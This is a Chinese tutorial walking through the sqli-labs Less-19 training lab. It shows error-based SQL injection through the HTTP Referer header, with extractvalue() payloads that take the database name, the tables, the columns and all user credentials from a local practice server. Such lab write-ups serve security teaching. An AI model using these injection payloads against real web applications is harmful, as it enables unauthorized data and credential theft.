# Sqli-Labs Less-19：基于 Referer 注入的复现

Less-19 是基于 **HTTP Referer 字段**的报错型SQL注入，核心是通过修改Referer头，利用MySQL报错函数泄露数据库信息。以下是完整复现步骤：

---

#### 1. 前置准备

- 启动sqli-labs环境，确保Less-19可访问。

- 准备工具：Burp Suite 或 浏览器插件HackBar（截图中使用HackBar）。

---

#### 2. 登录触发Referer记录

1. 访问 `http://127.0.0.1/sqli-labs/Less-19/`。

2. 输入默认账号密码：`admin` / `admin`，点击登录。

3. 登录成功后，页面会显示当前IP和Referer字段（初始为登录页URL）。

---

#### 3. 判断注入闭合方式

1. 用HackBar/Burp修改`Referer`为单引号 `'`：

    ```Plain Text
    
    Referer: '
    ```

2. 发送请求，观察SQL报错：

    ```Plain Text
    
    You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '127.0.0.1')' at line 1
    ```

    说明注入点闭合方式为**单引号 ** **`'`**。

---

#### 4. 构造报错注入Payload

利用`extractvalue()`函数进行报错注入，语法模板：

```SQL

' or extractvalue(1, concat(0x7e, [查询语句], 0x7e)) or '
```

- `0x7e` 是字符 `~`，用于分隔报错信息，便于提取结果。

---

#### 5. 逐步获取数据库信息

##### （1）获取当前数据库名

Payload：

```Plain Text

' or extractvalue(1, concat(0x7e, database(), 0x7e)) or '
```

返回报错：

```Plain Text

XPATH syntax error: '~security~'
```

当前数据库名为 `security`。

##### （2）获取数据库表名

Payload：

```Plain Text

' or extractvalue(1, concat(0x7e, (select group_concat(table_name) from information_schema.tables where table_schema=database()), 0x7e)) or '
```

返回：

```Plain Text

XPATH syntax error: '~emails,referers,uagents,users~'
```

可知`security`库下有`users`等表。

##### （3）获取`users`表列名

Payload：

```Plain Text

' or extractvalue(1, concat(0x7e, (select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='users'), 0x7e)) or '
```

返回：

```Plain Text

XPATH syntax error: '~id,username,password~'
```

`users`表包含`id`、`username`、`password`列。

##### （4）获取用户账号密码

Payload：

```Plain Text

' or extractvalue(1, concat(0x7e, (select group_concat(concat(username, ':', password)) from users), 0x7e)) or '
```

返回（示例）：

```Plain Text

XPATH syntax error: '~Dumb:Dumb,Angelina:I-kill-you,admin:admin,secure:crappy,stupid:stupidity,superman:hero,batman:mob!le,admin1:admin1,admin2:admin2,admin3:admin3, dhakkan:admin@123~'
```

成功获取所有用户的账号密码。

---

#### 6. HackBar操作示例

1. 打开Less-19并登录。

2. 启用HackBar，勾选`Referer`选项。

3. 输入Payload，点击`Execute`发送请求，从报错中提取数据。

---

### 核心原理

Less-19后端直接将`Referer`字段插入SQL语句，未做过滤，导致攻击者可通过修改Referer注入恶意SQL。由于插入操作触发报错，因此**报错注入**是最高效的利用方式。
> （注：文档部分内容可能由 AI 生成）